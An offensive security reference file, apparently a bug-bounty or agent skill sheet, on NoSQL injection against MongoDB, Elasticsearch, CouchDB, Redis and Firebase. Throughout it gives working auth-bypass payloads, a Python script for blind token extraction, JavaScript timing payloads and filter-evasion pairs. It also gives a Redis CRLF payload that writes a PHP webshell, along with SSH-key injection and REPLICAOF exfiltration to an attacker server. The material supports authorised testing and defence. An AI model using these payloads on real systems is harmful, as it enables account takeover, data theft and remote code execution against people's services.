---
name: nosql-injection
category: vulnerabilities
description: NoSQL injection covering MongoDB operator abuse, Mongoose query pollution, Elasticsearch DSL injection, CouchDB MapReduce, Redis CRLF, blind extraction, and database-specific techniques
depends_on: []
---

# NoSQL Injection

NoSQL injection exploits applications that build database queries from unsanitized input. The payloads are JSON operators, JavaScript snippets, regex patterns, and protocol commands — not SQL tautologies. MongoDB dominates real-world findings, but the class also covers Elasticsearch, CouchDB, Redis, DynamoDB, Firebase, and Cassandra. The most common payable pattern is still Express/Mongoose login endpoints accepting `{"$ne": ""}` as a password. Chains routinely reach Critical: blind token extraction enables account takeover, and admin feature abuse (webhooks, scripts) escalates to RCE.

## Discovery Signals

Technology fingerprints that indicate NoSQL injection opportunity. Presence of any row justifies operator injection testing.

| Signal | Where to Find | Implies |
|--------|--------------|---------|
| `MongoError`, `MongooseError`, `CastError` in error responses | 4xx/5xx bodies, stack traces | MongoDB backend, operator injection candidate |
| `_id` field with 24-char hex (ObjectID format) | JSON responses, cookies, URL params | MongoDB document store |
| `connect.sid` cookie + `express-session` | Response headers | Express + likely Mongoose |
| Meteor DDP protocol (`/sockjs/`, `method.callAnon`) | WebSocket traffic, JS source | Meteor + MongoDB, EJSON passes objects directly |
| `query_shard_exception`, `parsing_exception` in errors | Elasticsearch 4xx bodies | Elasticsearch DSL injection candidate |
| `/_cat/indices`, `/_search`, `/_mapping` endpoints | Port 9200/9300 reachable | Elasticsearch, possibly unauthenticated |
| `{"error":"...","reason":"..."}` JSON error shape | CouchDB 4xx responses | CouchDB, MapReduce injection candidate |
| `WRONGTYPE`, `ERR syntax error`, `-NOAUTH` | Redis error strings via SSRF | Redis protocol, CRLF injection candidate |
| `firebaseio.com`, `firestore.googleapis.com` in JS/APK | Network traffic, decompiled APK | Firebase RTDB/Firestore, rules misconfiguration |
| `Content-Type: application/json` on auth endpoints | Login/register/reset requests | JSON body parsed into objects, operator injection path |
| `?filter=`, `?q=`, `?query=` accepting JSON or base64 | REST list/search endpoints | Direct query passthrough to backend |
| GraphQL `filter`/`where`/`query` args as free-form JSON | GraphQL schema introspection | Resolver passes args unmodified to DB query |

## Attack Surface

**Query-Object Sinks**
- Login/signup endpoints passing `req.body` directly into `User.findOne()`
- Search/filter endpoints forwarding `req.query` into `.find()`
- Express with default `qs` parser: `?username[$ne]=x` becomes `{username: {$ne: "x"}}`
- Mongoose with `lean()` queries and no schema-cast
- Admin endpoints that build `$where` from user-supplied JS strings
- GraphQL resolvers that pass arguments unmodified as query filters
- Meteor `method.callAnon` exposing server methods to unauthenticated users (#1130721: pre-auth NoSQLi in Rocket.Chat `getPasswordPolicy` via unauth Meteor method)
- Password-reset/verify endpoints with `findOne({token})` sinks (#386807: flintcms ATO via blind MongoDB injection in reset token)

**Request Shapes That Invite It**
- `Content-Type: application/json` on login/register/reset-password
- Form bodies with bracket notation: `user[name]=x`
- GraphQL `filter`/`where`/`query` arguments as free-form JSON
- REST list endpoints with `filter=` or `q=` carrying base64/JSON
- Meteor DDP method calls where parameters are arbitrary EJSON
- Any `*.list` endpoint with a free-form `query` parameter (#1130874: Rocket.Chat `users.list` accepted raw MongoDB queries)

## MongoDB Operator Injection Matrix

| Operator | Payload Example | Context | Impact |
|----------|----------------|---------|--------|
| `$ne` | `{"password":{"$ne":null}}` | Auth bypass, any-match | Login as first matching user |
| `$gt` | `{"password":{"$gt":""}}` | Auth bypass, string comparison | Match any non-empty value |
| `$regex` | `{"token":{"$regex":"^a"}}` | Blind extraction, per-character | Extract tokens/hashes char-by-char |
| `$where` | `{"$where":"this.password.match(/^a/)"}` | Server-side JS evaluation | Boolean oracle, sleep-based timing, RCE on old drivers |
| `$exists` | `{"apiKey":{"$exists":true}}` | Field existence probe | Enumerate which fields are populated |
| `$type` | `{"password":{"$type":2}}` | Type-based filtering (2=string) | Filter by BSON type, bypass type checks |
| `$or` | `{"$or":[{"role":"admin"},{"role":"root"}]}` | Query restructuring | Escape fixed AND-chains, match multiple values |
| `$and` | `{"$and":[{"age":{"$gt":0}},{"role":"admin"}]}` | Compound conditions | Combine with other operators for precise targeting |
| `$nin` | `{"role":{"$nin":[]}}` | Not-in empty set | Match everything (empty exclusion list) |
| `$elemMatch` | `{"tags":{"$elemMatch":{"$regex":"admin"}}}` | Array field extraction | Probe array contents character by character |
| `$function` | `{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}` | MongoDB 4.4+ JS execution | Modern replacement for `$where`, same power |
| `$accumulator` | Pipeline `$group` with custom JS accumulator | Aggregation injection | Server-side JS in aggregation context |
| `$lookup` | `{"$lookup":{"from":"users","pipeline":[],"as":"leak"}}` | Aggregation pipeline injection | Read any collection the app role can access |
| `$out` / `$merge` | `{"$out":"attacker_collection"}` | Aggregation write stage | Overwrite collections (destructive, avoid in PoC) |

## Content-Type and Parameter Switching

Changing how input is delivered can enable operator injection when one format is filtered but another is not.

| Technique | From | To | Why It Works |
|-----------|------|----|-------------|
| JSON body injection | `username=admin&password=test` | `{"username":"admin","password":{"$ne":null}}` | Express accepts JSON if `Content-Type: application/json`; JSON allows nested objects |
| URL bracket notation | `password=test` | `password[$ne]=null` | Express `qs` parser builds objects from bracket syntax automatically |
| URL-encoded operators | `password[$ne]=null` (blocked) | `password[%24ne]=null` | URL-encode `$` as `%24` to bypass keyword filters |
| Double encoding | `%24ne` (blocked) | `%2524ne` | Second decode layer restores `$ne` after first filter pass |
| Mixed content-type | JSON body filtered | `application/x-www-form-urlencoded` with brackets | App may only sanitize one content type |
| Array coercion | `{"password":"test"}` | `{"password":["test"]}` | JS loose equality `"hash" == ["hash"]` can coerce; bcrypt.compare may error-open on type mismatch |

## Auth Bypass

Always-true operators:
```
{"$ne": null}         // not-equal to null -> matches any stored value
{"$ne": ""}           // not-equal to empty
{"$gt": ""}           // greater than empty string -> every non-empty
{"$regex": ".*"}      // match anything
{"$exists": true}     // field exists
{"$in": ["a","b"]}    // match any in list
{"$nin": []}          // not in empty list -> everyone
```

JSON body payloads:
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
{"username": {"$in": ["admin","root","administrator"]}, "password": {"$ne": null}}
```

URL-encoded (Express `qs` parser):
```
POST /login
username[%24ne]=null&password[%24ne]=null
```
Or repeated keys with bracket notation:
```
username[$ne]=null&password[$ne]=null
```

### Deep-Equal Auth Bypass (Mongoose + JS-level comparison)

Some apps call `User.findOne({username})` and then manually compare `user.password == req.body.password` with JS loose-equality. Send `password` as an array or object:
```json
{"username": "admin", "password": ["x"]}
```
`"hashed_pw" == ["hashed_pw"]` can coerce in quirky ways; more reliably, apps that pass the object directly to `bcrypt.compare` or just `===` fail open on type mismatch.

## Blind NoSQL Extraction Techniques

| Technique | Oracle Signal | Payload Pattern | Speed | When to Use |
|-----------|--------------|----------------|-------|-------------|
| Boolean-based `$regex` | Response diff (success vs failure, redirect target, status code) | `{"token":{"$regex":"^a"}}` per character | O(N x charset) | Default first choice; works on any injectable string field |
| Binary-search `$regex` | Same as above but with character ranges | `{"token":{"$regex":"^a[a-m]"}}` then narrow | O(N x log(charset)) | Large charsets (alphanumeric tokens) |
| Length probing | Match `$regex` with exact length | `{"token":{"$regex":"^.{32}$"}}` | O(log(maxlen)) | Determine token length before extraction |
| Timing-based `$where` | Response time differential (sleep injection) | `{"$where":"if(this.token.match(/^a/)){sleep(3000)};return true"}` | O(N x charset x delay) | When responses look identical, no boolean signal |
| Error-based | Different error messages for match vs no-match | `{"token":{"$regex":"^a","$options":"INVALID"}}` on match path | O(N x charset) | When error handling leaks query result state |
| `$where` JS oracle | Return value changes query truthiness | `{"$where":"this.roles.includes('admin') && /^A/.test(this.services.password.reset.token)"}` | O(N x charset) | Target specific documents (#1130874: targeted admin by combining role predicate with token extraction) |

Automated character-by-character extraction:
```python
import requests, string
url = "https://target.tld/login"
known = ""
chars = string.printable.strip()
while True:
    found = False
    for c in chars:
        r = requests.post(url, json={"username":"admin","password":{"$regex":f"^{known+c}"}})
        if r.status_code == 200 and "invalid" not in r.text.lower():
            known += c; found = True; print(known); break
    if not found: break
```

Use `$regex` anchors `^` and `$`; escape regex metacharacters in the known prefix. Binary-search on character ranges for speed.

### $where JavaScript Injection

If the app passes user input into a `$where` clause, you have server-side JS execution inside MongoDB:
```
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "sleep(3000) || true"}           // time-based oracle
{"$where": "function(){ return this.role == 'admin' }"}
```
MongoDB 4.4+ deprecated `$where` for performance; replaced by `$expr` with JS-aware operators. Still present in legacy apps.

### $function (MongoDB 4.4+)

```json
{"$expr": {"$function": {"body": "function(){ return true }", "args": [], "lang": "js"}}}
```

### Aggregation Injection

Aggregation pipelines built from user input: `$lookup` (join another collection), `$graphLookup`, `$merge`, `$out` (write to collection). If `from:` or pipeline stages are user-controlled, an attacker can exfil any collection the app has access to.

```json
{"pipeline": [{"$lookup": {"from":"users","pipeline":[],"as":"leak"}},{"$project":{"leak":1}}]}
```

## Database-Specific Techniques

| Database | Injection Vector | Blind Technique | Data Exfil Method |
|----------|-----------------|----------------|-------------------|
| MongoDB | `$ne`/`$regex`/`$where` operator injection via JSON body or bracket notation | `$regex` char-by-char, `$where` sleep, response differential | `$lookup` cross-collection, `$regex` extraction, `$out` to writable collection |
| Elasticsearch | `query_string` field override, `script_fields` Painless injection | Expensive `fuzziness:AUTO` for timing, `_source` field inclusion | `_source` include sensitive fields, `script_fields` to extract values, `_search/scroll` for bulk |
| Redis | CRLF injection in raw protocol, SSRF via `gopher://` | `CONFIG SET`+`SAVE` file write confirms access | `SLAVEOF`/`REPLICAOF` to exfil all data, `CONFIG SET dir`+`SAVE` for file write |
| CouchDB | `_temp_view` MapReduce injection, design doc PUT | `_all_docs?include_docs=true` for bulk read | MapReduce emit of sensitive fields, `_changes` feed for real-time data |
| Cassandra | CQL injection in string-concatenated queries | Time-based via `USING TIMESTAMP` manipulation | `SELECT * FROM system_schema.tables` for schema, `SELECT *` for data |
| DynamoDB | Condition expression injection via `FilterExpression` | Conditional check response (ConditionalCheckFailedException) | `attribute_exists`/`attribute_not_exists` for schema probing, scan with injected filter |
| Firebase RTDB | `.json` REST endpoint with public `.read=true` rules | `curl https://project.firebaseio.com/.json` returns data if misconfigured | Enumerate paths via `shallow=true`, download full database via `/.json` |
| Firestore | REST API query injection, overpermissive security rules (`request.auth != null`) | Collection listing via REST, document read via known paths | `GET /v1/projects/{p}/databases/(default)/documents/{collection}` for full collection read |

## Query Selector Pollution (Express/Mongoose)

The Express default `qs` parser turns `?a[b]=c` into `{a:{b:"c"}}`. If a handler does:
```js
User.findOne({ username: req.query.username, password: req.query.password })
```
An attacker sends `?username=admin&password[$ne]=x` and `password` becomes an object. Mongoose, when `strictQuery:false`, forwards the object.

Mitigations to confirm during triage (these defeat the bug):
- `express-mongo-sanitize` middleware (strips `$` and `.` keys)
- Mongoose `SchemaType.cast()` coercing to expected primitive
- Explicit `String(req.query.x)` conversion
- `express.urlencoded({ extended: false })` (QS parser that doesn't build objects)

## Elasticsearch DSL Injection

Apps that forward user JSON into the ES `_search` body are vulnerable when any sensitive field can be queried.

**Bypass filter via `query_string`**:
```json
{"query": {"query_string": {"query": "role:admin OR password:*"}}}
```

**Scripting** (if `inline` scripts enabled in `elasticsearch.yml`):
```json
{"script_fields": {"x": {"script": {"source": "doc['password'].value", "lang": "painless"}}}}
```

**Exfil via `_source` include**:
```json
{"_source": ["password","apiKey","secret"], "query": {"match_all": {}}}
```

**DoS via expensive queries**: nested `fuzzy`, unbounded `regexp`, `script_score` with huge loops.

**Search-index ACL desync** (#708820, #710006): when Elasticsearch backs a search feature, the index may contain data from contexts the querying user cannot access. Query-time filtering applied at the wrong level (document vs field vs substring) creates blind oracles over private data. Test by searching for terms that should only exist in inaccessible contexts.

## CouchDB MapReduce Injection

CouchDB view functions are JS. If the app creates temporary views from user input (deprecated but still found in legacy):
```
POST /_temp_view
{"map":"function(doc){ if(doc.password){ emit(doc._id, doc.password) } }"}
```
Modern CouchDB forbids `_temp_view` by default but design-doc injection via PUT to `/db/_design/x` is still possible when app auth allows document writes.

CouchDB also has a classic CVE-2017-12635 (privilege escalation via duplicate JSON keys) still seen in unpatched installs.

## Redis Injection via CRLF

When an app embeds user input into Redis commands over a raw protocol connection (rare but devastating):
```
GET user:USER_INPUT
```
If `USER_INPUT` = `admin\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET[0]); ?>"\r\nSAVE`, the attacker drops a webshell.

This applies to:
- App-level Redis clients that don't quote/escape (Perl/Python raw socket wrappers)
- SSRF-to-Redis via `gopher://` with embedded CRLF
- HTTP-to-Redis via misconfigured proxy

Command execution vectors once in Redis (#1672388: GitLab RCE via Redis RESP protocol injection from type-confused Sawyer object):
- `CONFIG SET` webroot + `SAVE` to drop a file
- `SLAVEOF`/`REPLICAOF` to replicate to attacker server (confirmed against gitlab.com)
- `MODULE LOAD` on old/unpatched Redis
- SSH key injection: `CONFIG SET dir /root/.ssh` + `SET x "\n\nssh-rsa ...\n\n"` + `CONFIG SET dbfilename authorized_keys` + `SAVE`
- Sidekiq/Resque queue poisoning with Marshal-serialized gadget chains
- Cache poisoning with serialized objects that trigger RCE on deserialization (#2071554: Kredis JSON deserialization from Redis)

## Time-Based Blind

When responses look identical, fall back to timing.

**MongoDB `$where`**:
```json
{"$where": "if(this.password.match(/^a/)){sleep(3000)}; return true"}
```

**Aggregation `$function`**:
```json
{"$expr":{"$function":{"body":"function(){ if(this.role=='admin'){ let d=Date.now(); while(Date.now()-d<3000){} }; return true }","args":["$$ROOT"],"lang":"js"}}}
```

**Elasticsearch**: no clean sleep; use expensive `fuzziness:AUTO` on large fields.

## Defense-Bypass Pairs

| Defense | Bypass | Technique |
|---------|--------|-----------|
| Keyword filter strips literal `$` | URL-encode: `%24ne` | Encoding survives transport, decoded before DB query |
| Shallow filter strips top-level `$` keys | Nested operator: `{"field":{"$eq":{"$ne":""}}}` | Filter only inspects first level |
| `express-mongo-sanitize` with `replaceWith:'_'` | Check if handler strips `_` prefix, restoring operator | Misconfigured replacement creates bypassed keys |
| Content-type validation (JSON only) | Switch to `application/x-www-form-urlencoded` with bracket notation | Same qs parser builds same objects from form data |
| `$regex` blocked by operator allowlist | Use `$where` with `/regex/.test()` | `$where` is JS evaluation, not a query operator name (#1130874) |
| Rate limiting on login endpoint | Use a different oracle endpoint (search, verify, password-policy) | Same DB, different rate-limit scope (#1130721: used `getPasswordPolicy` instead of login) |
| Server rejects objects in password field | Send `{"password":["x"]}` (array, not object) | Arrays bypass object-type checks but coerce differently in JS equality |
| `typeof !== 'object'` type check | Prototype pollution to add `$ne` to String prototype | Requires separate PP primitive, but converts string to injectable |

## Chain Patterns

| Chain | Steps | Severity | Report Reference |
|-------|-------|----------|-----------------|
| NoSQLi -> Auth bypass -> ATO | Operator injection on login -> session as victim | Critical | #397445: express-cart login bypass |
| NoSQLi -> Blind token extraction -> ATO | `$regex` on reset token field char-by-char -> use token to reset password | Critical | #1130721: Rocket.Chat pre-auth RCE chain |
| NoSQLi -> ATO -> RCE via admin feature | Token extraction -> admin login -> webhook/script execution | Critical | #1130874: `$where` leak -> admin ATO -> webhook RCE |
| NoSQLi -> Email enumeration -> Targeted ATO | `$regex` on email field -> enumerate users -> chain with reset flow | High | #386807: flintcms two-stage email+token extraction |
| NoSQLi -> Cross-collection exfil | Aggregation `$lookup` injection -> read users/secrets collection | High | Aggregation pipeline with `from:` user-controlled |
| NoSQLi -> DoS | `$regex` with catastrophic backtracking, `$where` infinite loop | Medium | `{"$regex":"(a+)+$"}` on large fields |
| SSRF -> Redis CRLF -> RCE | SSRF via `gopher://` -> inject Redis commands -> webshell or REPLICAOF | Critical | #1672388: GitLab import -> Redis -> Marshal RCE |
| NoSQLi -> Message/data exfil | Blind token extraction -> authenticate as visitor -> load message history | High | #2580062: Rocket.Chat livechat message leak |

## Bug-Bounty Framing

**What makes this payable**
- Auth bypass with clean JSON operator payload producing admin session
- Blind extraction of a password hash, API key, or token via regex scan
- Evidence of MongoDB/Mongoose in the stack (error messages, `_id` ObjectID format, cookie names like `connect.sid`)
- Clear differential response: login succeeds with operator, fails with normal value

**Common triager pushback**
- "Users can't actually log in as admin." -> Demonstrate by capturing the session cookie and showing admin-only endpoint access
- "It's just the default `qs` parser, not the app's fault." -> The app still passes user input directly to `findOne`. Either sanitize (`express-mongo-sanitize`) or cast. This is standard Express advice
- "Rate limit prevents blind extraction." -> Show any leak: single character, username enumeration, existence of admin account
- "We require 2FA." -> 2FA is bypassed when `findOne({username:{$ne:null}})` returns `user[0]` and code checks `if(user){ issue_session }`. If they actually `bcrypt.compare(user.pass, req.body.pass)` after lookup, type-mismatch often short-circuits favorably

**Preempt**
- Show the session-cookie of the account you logged in as
- Screenshot admin-gated endpoint accessible with that cookie
- Include Content-Type header — some endpoints only accept JSON, others only form; show which one the bug needs

## Testing Methodology

1. Fingerprint DB — error messages, ObjectID format, cookie/session style, Meteor DDP presence
2. Attempt operator injection on login JSON first (`{"$ne":null}` on password field)
3. If JSON is rejected, try URL-encoded bracket notation (`password[$ne]=null`)
4. If brackets filtered, try URL-encoded operators (`password[%24ne]=null`)
5. Escalate to blind regex extraction when auth bypass works
6. Look for `$where`/`$function` sinks in admin endpoints and list/search APIs
7. Test forgot-password/verify/reset-token endpoints specifically — `findOne({token})` is a pristine NoSQLi sink
8. Probe Elasticsearch/CouchDB endpoints if exposed (`/_search`, `/_all_dbs`)
9. Check every GraphQL `filter:`, `where:`, `query:` arg
10. Scan for query-selector pollution: any endpoint that accepts JSON or object params
11. For Meteor apps: enumerate `method.callAnon` methods and test each parameter for type coercion gaps
12. Diff sibling methods — when one has a type check and its sibling does not, the missing one is the bug (#2580062: asymmetric defense signal)

## Validation

1. Exact request and response pair showing bypass or extraction
2. Proof of impact: admin cookie retrieved, password hash leaked, token extracted
3. Reproducibility: 2-3 runs with same payload
4. Stack fingerprint: screenshot of error or characteristic behavior proving the DB in use

## False Positives

- Endpoint accepts object but subsequently `String()`-casts before query
- `express-mongo-sanitize` or `mongo-sanitize` middleware stripping `$`/`.`
- Schema-defined Mongoose model with strict types — coerces to `String`, operator becomes `"[object Object]"`
- Login returns success but session is invalid for downstream calls (cookie bypass that doesn't actually authenticate)
- Elasticsearch responding to `query_string` but only on non-sensitive indexes scoped to the current user
- Meteor `check(param, String)` enforcing type before query — common in well-maintained Meteor apps

## Impact

- Authentication bypass into any account, typically admin
- Full collection/index extraction via blind techniques
- Account takeover chains: token extraction -> password reset -> admin access -> RCE via webhooks/scripts
- DoS via expensive regex, nested queries, or `$where` loops
- Server-side JS execution via `$where`/`$function` (restricted, but historical RCE via driver bugs)
- Webshell drop via Redis CRLF
- Cross-collection data exfiltration via aggregation pipeline injection

## Pro Tips

1. Default to JSON body first with `Content-Type: application/json` — Express apps usually accept it even if the main frontend uses form
2. Mongoose strict mode hides the bug at the schema level; test with unexpected field names to see if they get silently dropped
3. Regex extraction is noisy — use response-length diffs and timing combined, not just status codes
4. When `$where` isn't available, `$expr` + `$function` is the modern equivalent (MongoDB 4.4+)
5. GraphQL resolvers passing `where:` to Mongoose are the highest-density hunting ground in 2024-2026
6. Elasticsearch on an unauthenticated port is still common in enterprise; `curl host:9200/_cat/indices` before chasing injection
7. For Redis CRLF, SSRF + `gopher://localhost:6379` is the realistic path; direct app-level Redis injection is rare
8. Always test forgot/reset/verify flows — they tend to use `findOne({token})` and `findOne({email})` which are pristine NoSQLi sinks sitting on the auth-bypass critical path (#386807, #1130721)
9. Combine role predicates with extraction in `$where`: `this.roles.includes('admin') && /^A/.test(this.token)` targets specific high-value documents instead of random matches (#1130874)
10. When one method has a type guard (`typeof token !== 'string'`) and a sibling does not, the gap is the bug — asymmetric defense is a reliable signal (#2580062)
11. Filter-passthrough endpoints (`?query=`, `?filter=`) with restricted output are blind-injection oracles — the query operates over the full document, not the projection (#1130874: output field restriction is not security)
12. For Firebase: extract `databaseURL` from `google-services.json` (APK) or `GoogleService-Info.plist` (IPA), then `curl https://project.firebaseio.com/.json` — unauthenticated read confirms misconfigured rules (#684099)

## Summary

NoSQL injection trades SQL tautologies for JSON operators and server-side JS. Probe login endpoints with `{"$ne":null}` first, escalate to regex extraction on confirmed operator injection, and fingerprint the database from error messages. Forgot-password and reset-token verification endpoints are the highest-value sinks because `findOne({token})` is a direct NoSQLi-to-ATO path. Most payable findings are still the classic Mongoose auth bypass, but the chains to Critical (blind extraction -> ATO -> admin feature RCE) are where the real bounty sits.
